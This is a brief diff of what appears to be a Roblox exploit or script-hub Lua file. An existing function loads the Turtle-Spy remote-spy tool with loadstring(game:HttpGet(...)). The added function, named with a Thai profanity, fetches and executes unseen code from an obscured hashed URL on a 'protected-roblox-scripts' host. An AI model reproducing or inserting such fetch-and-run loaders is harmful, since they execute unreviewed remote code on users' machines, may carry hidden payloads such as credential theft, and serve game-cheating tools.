@@ -13,3 +13,6 @@ end
 function rspy()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
 end
+function ควย()
+loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/809d4d7da06b3d272a5a9dc9295656d0"))()
+end
